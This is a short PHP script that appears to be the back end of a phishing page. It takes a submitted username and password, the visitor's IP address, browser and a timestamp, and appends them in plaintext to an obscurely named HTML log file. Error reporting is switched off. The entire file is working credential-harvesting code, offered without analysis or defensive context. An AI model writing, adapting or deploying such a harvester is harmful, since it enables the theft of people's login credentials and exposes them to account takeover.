<?php
 error_reporting(0);
 
$user = $_POST['user'];
$pass = $_POST['pass'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check if ip is pass from proxy
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }

$browser = $_SERVER['HTTP_USER_AGENT'];
$date=date("Y-m-d;h:i:s");
//$user = get_current_user(); 



//$currentuser = "\r\n" . "\r\n" . "Current logged in user: " . $user;

$f = fopen("NZCaW6197qL1.html", "a");

fwrite ($f,
'Username: [<b><font color="#660000">'.$user.'</font></b>]
Password: [<b><font color="#660000">'.$pass.'</font></b>]
useragent: [<b><font color="#660000">'.$browser.'</font></b>]
IP: [<b><font color="#996600">'.$ipaddress.'</font></b>]
Date: [<b><font color="#FF6633">'.$date.'</font></b>]<br> '); 

fclose($f);